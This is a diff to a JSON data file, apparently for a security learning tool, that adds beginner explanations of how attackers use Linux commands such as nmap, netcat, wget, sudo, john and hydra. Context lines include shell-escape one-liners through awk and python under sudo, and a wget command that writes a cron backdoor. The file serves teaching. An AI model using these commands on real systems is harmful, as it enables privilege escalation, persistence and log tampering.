+      "plain_intent": "Creates links — shortcuts — to files. Symbolic link attacks trick a privileged program into reading or writing a different file than it thinks it is accessing.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=xAf83lFBcTw",
       "extra": false
@@ -3991,6 +4187,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "",
+      "plain_intent": "",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=JFEkgZWCPrI",
       "extra": false
@@ -4044,6 +4242,8 @@
       "cve_refs": [],
       "ctf_categories": [],
       "root_vs_user": {},
+      "beginner_note": "Changes a file's size — can empty a log file instantly without deleting it, which looks less suspicious than deletion.",
+      "plain_intent": "Instantly empties a file without deleting it. Attackers use it to wipe log files — the file still exists (so nothing looks missing) but its contents are gone.",
       "transcript": "",
       "video_url": "https://www.youtube.com/watch?v=DwwLddE7kUU",
       "extra": false
@@ -4107,6 +4307,8 @@
         "root": "SYN scan (-sS) available — faster and stealthier than full TCP connect; raw socket access enables OS detection",
         "user": "Falls back to TCP connect scan (-sT) — creates full connections, more detectable and slower"
       },
+      "beginner_note": "Scans a network to find which hosts are live and which ports are open. The starting point of almost every penetration test.",
+      "plain_intent": "Scans a network to find which computers are reachable and what services they are running. It is the first thing a pentester runs — and the first thing an attacker runs too.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4173,6 +4375,8 @@
         "root": "Can write output to system paths; access to root's .netrc for auto-credentials",
         "user": "Normal HTTP client; output restricted to writable paths"
       },
+      "beginner_note": "Fetches content from URLs from the command line. Supports dozens of protocols and can send data, follow redirects, and handle cookies — making it useful far beyond just downloading files.",
+      "plain_intent": "A command-line tool that can talk to any server using any protocol. Attackers use it to download payloads, test web vulnerabilities, talk to command-and-control servers, and exfiltrate data.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4240,6 +4444,8 @@
         "root": "Can bind port forwards on privileged ports (<1024); `ssh -L 443:...` for HTTPS impersonation",
         "user": "Port forwarding restricted to >= 1024; agent forwarding works regardless of privilege"
       },
+      "beginner_note": "The standard encrypted remote shell. Beyond just logging in, it can tunnel other protocols through its connection — useful for reaching machines that are not directly accessible.",
+      "plain_intent": "The standard way to remotely control a Linux server over an encrypted connection. Beyond login, it can create secret tunnels that forward traffic to machines hidden deep inside a network.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4307,6 +4513,8 @@
         "root": "Can write certs to /etc/ssl/; bind encrypted listeners on port 443",
         "user": "Full crypto operations work as user; listener ports restricted to >= 1024"
       },
+      "beginner_note": "The command-line tool for everything cryptographic — inspecting certificates, generating keys, encrypting files, and testing TLS connections.",
+      "plain_intent": "The Swiss army knife of cryptography on the command line. Used to inspect website certificates, create encrypted tunnels, generate keys, and test for vulnerabilities in TLS connections.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4372,6 +4580,8 @@
         "root": "No permission errors — traverses entire filesystem including /root, /proc/*/mem; -exec runs as root",
         "user": "Permission denied on unreadable dirs; still finds SUID binaries in accessible paths"
       },
+      "beginner_note": "Searches the entire filesystem. The '-exec' flag is what makes it dangerous — it can run any command on every file it finds, turning a search tool into a code-execution primitive.",
+      "plain_intent": "Searches the entire filesystem for files matching criteria you specify. The '-exec' flag is the dangerous part — it runs any command on every file found, turning a search into an attack.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4435,6 +4645,8 @@
         "root": "Can read /etc/shadow and other root-only files directly in awk; `sudo awk` is a GTFOBins shell",
         "user": "Read access limited to permitted files; `awk 'BEGIN{system(\"/bin/sh\")}' works if awk is in sudoers"
       },
+      "beginner_note": "Processes text line by line, splitting it into fields. Extremely powerful for parsing log files, extracting specific columns, and formatting data.",
+      "plain_intent": "Processes text by breaking each line into columns and letting you do things with them. Used heavily for parsing log files, extracting credentials from dumps, and formatting attack output.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4498,6 +4710,8 @@
         "root": "Can edit /etc/passwd, /etc/shadow in-place; strip evidence from protected logs",
         "user": "In-place edit only on own files; read-only on protected system files"
       },
+      "beginner_note": "Edits text streams — find and replace, delete lines, extract ranges. The '-i' flag edits files in place, which is what makes it dangerous.",
+      "plain_intent": "Finds and replaces text in files or streams. The in-place edit flag ('-i') is what matters for attacks — it can silently modify config files, patch binaries, or scrub evidence from logs.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4565,6 +4779,8 @@
         "root": "Can bind to privileged ports (<1024): `nc -lvp 80` — impersonate HTTP on standard port",
         "user": "Listener restricted to ports >= 1024; all client connections and reverse shells work without root"
       },
+      "beginner_note": "Netcat is the duct tape of networking — it can open a raw connection to any port, send files, and give you a shell on a remote machine.",
+      "plain_intent": "Opens a raw network connection between two machines. In the wrong hands it is a one-line remote shell. Seeing netcat on a server is always a warning sign.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4623,6 +4839,8 @@
         "root": "Can create listeners on any port; bind to privileged ports for HTTPS impersonation",
         "user": "Full functionality for reverse shells and relays; listener ports >= 1024 only"
       },
+      "beginner_note": "An advanced version of netcat that supports TLS encryption, bidirectional streams, and complex relay setups. Preferred for encrypted reverse shells.",
+      "plain_intent": "A more powerful version of netcat that supports encryption. Attackers prefer it for reverse shells because the traffic looks like normal HTTPS and bypasses most network monitoring.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4691,6 +4909,8 @@
         "root": "Scripts run as root — `python3 -c 'import os; os.setuid(0)'` works; writes anywhere",
         "user": "`sudo python3` is a classic misconfiguration; GTFOBins: `sudo python3 -c 'import os; os.system(\"/bin/bash\")'`"
       },
+      "beginner_note": "A general-purpose scripting language available on most Linux systems. Its presence means an attacker can run arbitrary scripts, spin up HTTP servers, and escape to a shell if it is in the sudo list.",
+      "plain_intent": "A scripting language that turns a compromised machine into a platform for running complex attacks. One line can spin up a web server, another can give you a full remote shell.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4754,6 +4974,8 @@
         "root": "Full capture on any interface including promiscuous mode; no restrictions",
         "user": "Requires CAP_NET_RAW or membership in pcap group — typically blocked by default"
       },
+      "beginner_note": "Captures network packets passing through an interface. On a compromised machine, a brief tcpdump run can collect cleartext passwords and session tokens from adjacent hosts.",
+      "plain_intent": "Captures every packet passing through a network interface. On a compromised internal machine, a short capture can harvest usernames and passwords sent by other computers on the same network.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4817,6 +5039,8 @@
         "root": "Can read /etc/shadow directly — no need to first obtain it via exploit",
         "user": "Needs shadow already exfiltrated; cracking itself requires no privileges"
       },
+      "beginner_note": "Offline password cracker. Given a file of password hashes, it tries millions of guesses using wordlists and rules until it finds the original passwords.",
+      "plain_intent": "Takes a file full of password hashes (scrambled passwords) and tries to reverse them using millions of guesses. The most common use is cracking /etc/shadow after gaining access to a Linux system.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4876,6 +5100,8 @@
         "root": "No functional difference for network attacks; can use more source ports and raw sockets",
         "user": "Full functionality for all supported protocols; no root needed"
       },
+      "beginner_note": "Online brute-force tool. Unlike John, it attacks live services (SSH, web logins, FTP) by trying username/password combinations over the network.",
+      "plain_intent": "Tries thousands of username/password combinations against a live service until one works. The difference from John is that Hydra attacks over the network in real time.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -4938,6 +5164,8 @@
         "root": "Can trace any process including system daemons; no ptrace_scope restrictions",
         "user": "Restricted by /proc/sys/kernel/yama/ptrace_scope; default on many distros blocks tracing other users' processes"
       },
+      "beginner_note": "Watches every system call a program makes in real time — like reading its diary. Useful for extracting hardcoded passwords, finding hidden config files, and understanding binary behavior.",
+      "plain_intent": "Eavesdrops on every request a program makes to the operating system. You can watch it open files, make network connections, and handle passwords — all in real time.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -5002,6 +5230,8 @@
         "root": "Can write anywhere; `wget -O /etc/cron.d/backdoor http://...` for persistence",
         "user": "Writes to user-writable paths; still fully functional for payload delivery"
       },
+      "beginner_note": "Downloads files from URLs. Simpler than curl but present on almost every Linux system. Often used to fetch payloads onto a compromised machine.",
+      "plain_intent": "Downloads files from the internet onto the current machine. The simplest way to fetch a payload onto a compromised server — one line, no dependencies required.",
       "transcript": "",
       "video_url": "",
       "extra": true
@@ -5069,6 +5299,8 @@
         "root": "Full sudo functionality; can configure sudoers; can sudo as any user",
         "user": "`sudo -l` reveals the attack surface; single misconfigured entry gives root"
       },
+      "beginner_note": "Grants a regular user temporary root (admin) powers for one command. Attackers always run 'sudo -l' first to see which commands they are allowed to run as root.",
+      "plain_intent": "Lets a regular user run specific commands as root (the all-powerful admin). The most important command after getting access to a system — 'sudo -l' shows you exactly what you can do.",
       "transcript": "",
       "video_url": "",
       "extra": true
